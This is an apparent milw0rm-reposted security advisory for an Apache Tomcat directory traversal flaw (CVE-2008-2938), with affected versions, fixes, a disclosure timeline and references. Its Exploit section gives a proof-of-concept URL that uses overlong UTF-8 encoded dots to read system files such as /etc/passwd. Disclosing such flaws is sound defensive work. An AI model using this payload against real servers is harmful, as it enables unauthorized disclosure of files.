@@ -1,0 +1,30 @@
+Title: Apache Tomcat Directory Traversal Vulnerability
+Author: Simon Ryeo(bar4mi (at) gmail.com, barami (at) ahnlab.com)
+Severity: High
+Impact: Remote File Disclosure
+Vulnerable Version: prior to 6.0.18
+Solution:
+ - Best Choice: Upgrade to 6.0.18 (http://tomcat.apache.org)
+ - Hot fix: Disable allowLinking or do not set URIencoding to utf8 in order to avoid this vulnerability.
+ - Tomcat 5.5.x and 4.1.x Users: The fix will be included in the next releases. Please apply the hot fix until next release.
+References:
+ - http://tomcat.apache.org/security.html
+ - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2938
+History:
+ - 07.17.2008: Initiate notify (To Apache Security Team)
+ - 08.02.2008: Responsed this problem fixed and released new version
+ - 08.05.2008: Notify disclosure (To Apache Tomcat Security Team)
+ - 08.10.2008: Responsed with some suggestions.
+
+Description
+As Apache Security Team, this problem occurs because of JAVA side.
+If your context.xml or server.xml allows 'allowLinking'and 'URIencoding' as
+'UTF-8', an attacker can obtain your important system files.(e.g.  /etc/passwd)
+
+Exploit
+If your webroot directory has three depth(e.g /usr/local/wwwroot), An
+attacker can access arbitrary files as below. (Proof-of-concept)
+
+http://www.target.com/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/foo/bar
+
+# milw0rm.com [2008-08-11]
